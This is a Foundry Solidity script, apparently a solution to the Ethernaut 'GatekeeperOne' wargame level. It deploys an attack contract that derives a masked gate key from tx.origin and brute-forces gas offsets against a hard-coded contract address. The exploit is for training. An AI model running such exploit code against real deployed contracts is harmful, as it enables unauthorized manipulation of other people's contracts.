// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import {GatekeeperOne} from "../../src/ethernaut/13_GatekeeperOne.sol";

contract ExploitScript is Script {
    GateKeeperAttack GateKeeperAttackContract;
    GatekeeperOne gatekeeperOne =
        GatekeeperOne(payable(0x9Bab40648AdF1679D8fA674304DEf79701884ff5));

    function run() public {
        vm.startBroadcast();
        GateKeeperAttackContract = new GateKeeperAttack();
        GateKeeperAttackContract.Attack();
        vm.stopBroadcast();
    }
}

contract GateKeeperAttack {
    GatekeeperOne gatekeeperOne =
        GatekeeperOne(payable(0x9Bab40648AdF1679D8fA674304DEf79701884ff5));

    function Attack() public {
        bytes8 _gateKey = bytes8(uint64(uint160(tx.origin))) &
            0xffffffff0000ffff;
        for (uint256 i = 0; i < 300; i++) {
            (bool success, ) = address(gatekeeperOne).call{gas: i + (8191 * 3)}(
                abi.encodeWithSignature("enter(bytes8)", _gateKey)
            );
            if (success) {
                break;
            }
        }
    }
}
